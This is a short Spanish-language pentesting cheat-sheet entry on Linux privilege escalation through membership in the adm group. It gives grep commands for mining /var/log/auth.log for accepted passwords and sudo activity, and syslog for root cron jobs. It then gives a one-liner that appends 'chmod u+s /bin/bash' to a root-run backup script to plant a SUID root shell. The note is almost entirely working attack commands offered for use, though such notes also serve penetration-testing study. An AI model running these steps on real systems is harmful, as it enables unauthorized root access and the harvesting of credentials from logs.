---
tags: [privesc, linux, adm]
---

# ADM Group

Los miembros del grupo **adm** pueden leer `/var/log` — logs del sistema con crontabs y pistas para escalar.

Referencia: https://medium.com/@shehacks_/im-in-the-adm-group-can-i-escalate-yes-eventually-9475b968b97a

## Archivos a Revisar

**auth.log:**

```bash
grep "Accepted password" /var/log/auth.log
grep "sudo" /var/log/auth.log
```

**syslog — cron jobs y scripts:**

```bash
grep CRON /var/log/syslog | grep "(root)" | grep -v 'CMD ()'
```

Si encontramos una tarea programada → activar bit SUID:

```bash
echo "chmod u+s /bin/bash" >> /dmz-backups/backup.sh
```

